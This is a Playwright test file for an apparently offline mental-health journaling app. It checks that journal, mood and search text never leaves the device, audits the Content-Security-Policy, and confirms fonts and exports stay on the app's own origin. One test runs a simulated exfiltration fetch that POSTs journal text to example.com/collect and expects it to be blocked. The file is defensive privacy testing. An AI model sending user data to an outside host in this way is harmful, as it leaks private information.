import { expect, test, type Page, type Request } from '@playwright/test'
import { expectNoA11yViolations, seedProfile, stubVoices, todayISO } from './helpers'

/**
 * The promise, as a test.
 *
 * Mindful's landing page tells people that nothing they write leaves their
 * device. Everywhere else that claim is defended by architecture — no backend,
 * no analytics SDK, a Content-Security-Policy with `connect-src 'self'` — but
 * architecture is an argument, and this is evidence. The app is driven the way
 * a person drives it, with real text typed into the parts that take real text,
 * while every single request the browser makes is recorded. Any request to any
 * origin but this one fails the suite.
 *
 * That is a deliberately blunt instrument. It cannot be satisfied by careful
 * wording, and it breaks the moment someone adds an analytics snippet, a font
 * CDN, an error reporter or a "just this one" API call — which is exactly the
 * change this repository should not be able to merge quietly.
 *
 * The embedding model's weights are the one documented exception, and they are
 * not fetched here: nothing in this walk consents to the download, so nothing
 * in this walk should reach the network at all.
 */

/** Text nobody should ever see leave the machine. Searched for in every request. */
const SECRETS = {
  journal: 'Zenobia flinched at the harpsichord again, and I could not say why',
  moodNote: 'Quicksilver marmalade under the third pylon',
  echoQuery: 'Zenobia harpsichord',
}

interface Seen {
  urls: string[]
  bodies: string[]
}

/** Record every request the page makes, and every body it sends with one. */
function watchNetwork(page: Page): Seen {
  const seen: Seen = { urls: [], bodies: [] }

  page.on('request', (request: Request) => {
    seen.urls.push(request.url())
    const body = request.postData()
    if (body) seen.bodies.push(body)
  })

  return seen
}

const ALLOWED_ORIGIN = '127.0.0.1:5178'

/** Requests that did not go to this app's own origin. */
function offOrigin(urls: string[]): string[] {
  return urls.filter((url) => {
    // In-page schemes never touch a network.
    if (/^(data|blob|about|chrome-extension):/.test(url)) return false
    return !url.startsWith(`http://${ALLOWED_ORIGIN}/`)
  })
}

test.describe('nothing leaves the device', () => {
  test.beforeEach(async ({ page }) => {
    await seedProfile(page)
    await stubVoices(page)
  })

  test('a full session of real use makes no request to any other origin', async ({ page }) => {
    const seen = watchNetwork(page)

    // The landing page, where the promise is made.
    await page.goto('/')
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible()

    // A mood check-in, with a note in it.
    await page.goto('/mood')
    await page.getByRole('group', { name: /How today feels/i }).getByText('Okay', { exact: true }).click()
    await page.getByLabel(/A note to yourself/i).fill(SECRETS.moodNote)
    await page.getByRole('button', { name: /Save today's check-in/i }).click()
    await expect(page.getByRole('status')).toContainText('Check-in saved')

    // A journal entry, which is the most private thing the app holds.
    await page.goto('/journal')
    await page.getByLabel('Your entry').fill(SECRETS.journal)
    await page.getByRole('button', { name: 'Save entry' }).click()
    await expect(page.getByRole('status')).toContainText('Entry saved')

    // A search across it, on the keyword engine — no model download consented to.
    await page.goto('/echo')
    await page.getByLabel(/How are things right now/i).fill(SECRETS.echoQuery)
    await page.getByRole('button', { name: 'Look back', exact: true }).click()
    await page.waitForTimeout(1_500)

    // A self-check, which is clinical data.
    await page.goto('/self-check')
    await page.waitForTimeout(500)

    // A breathing session with the voice guide running.
    await page.goto('/breathe')
    await page.getByText('Guide me by voice').click()
    await page.getByRole('button', { name: 'Begin' }).click()
    await page.waitForTimeout(3_000)
    await page.getByRole('button', { name: 'Stop' }).click()

    // Settings, which can export everything.
    await page.goto('/settings')
    await page.waitForTimeout(500)

    // Guard against a green tick that only means the recorder saw nothing: a
    // walk of seven screens loads scripts, styles and fonts.
    expect(seen.urls.length).toBeGreaterThan(10)
    expect(offOrigin(seen.urls)).toEqual([])

    // Belt and braces: even a same-origin request must not be carrying it.
    for (const body of seen.bodies) {
      expect(body).not.toContain(SECRETS.journal)
      expect(body).not.toContain(SECRETS.moodNote)
    }
    expect(seen.urls.join('\n')).not.toContain(encodeURIComponent(SECRETS.echoQuery))
  })

  test('the page declares a policy that would block a leak even if code tried', async ({
    page,
  }) => {
    await page.goto('/')

    const policy = await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content')

    expect(policy).toBeTruthy()
    const normalised = (policy ?? '').replace(/\s+/g, ' ')

    // The directives that do the actual work.
    expect(normalised).toContain("default-src 'self'")
    expect(normalised).toContain("form-action 'none'")
    expect(normalised).toContain("object-src 'none'")
    expect(normalised).toContain("base-uri 'self'")
    expect(normalised).toContain("font-src 'self'")

    // connect-src may name the model host, and nothing else.
    const connectSrc = normalised.match(/connect-src ([^;]+)/)?.[1] ?? ''
    const hosts = connectSrc
      .trim()
      .split(' ')
      .filter((source) => source.startsWith('http'))
    for (const host of hosts) {
      expect(host).toMatch(/^https:\/\/(huggingface\.co|cdn-lfs.*\.hf\.co|cas-bridge\.xethub\.hf\.co)$/)
    }
  })

  test('a blocked exfiltration attempt really is blocked', async ({ page }) => {
    await page.goto('/')

    // Try, from inside the page, to do the thing the policy exists to prevent.
    const result = await page.evaluate(async () => {
      try {
        await fetch('https://example.com/collect', {
          method: 'POST',
          body: 'a journal entry',
          mode: 'no-cors',
        })
        return 'allowed'
      } catch (error) {
        return `blocked: ${String(error)}`
      }
    })

    expect(result).toContain('blocked')
  })

  test('fonts are served from this origin, not a CDN', async ({ page }) => {
    const seen = watchNetwork(page)

    await page.goto('/')
    await expectNoA11yViolations(page)

    const fonts = seen.urls.filter((url) => /\.(woff2?|ttf|otf)(\?|$)/.test(url))
    expect(fonts.length).toBeGreaterThan(0)
    for (const font of fonts) {
      expect(font).toContain(ALLOWED_ORIGIN)
    }
    expect(seen.urls.join('\n')).not.toContain('fonts.googleapis.com')
    expect(seen.urls.join('\n')).not.toContain('fonts.gstatic.com')
  })

  test('an export is generated in the page, not fetched from anywhere', async ({ page }) => {
    const seen = watchNetwork(page)

    await page.goto('/settings')
    const download = page.waitForEvent('download')
    await page.getByRole('button', { name: 'Export my data' }).click()
    const file = await download

    expect(file.suggestedFilename()).toMatch(/^mindful-export-\d{4}-\d{2}-\d{2}\.json$/)
    expect(offOrigin(seen.urls)).toEqual([])
    expect(todayISO()).toBeTruthy()
  })
})
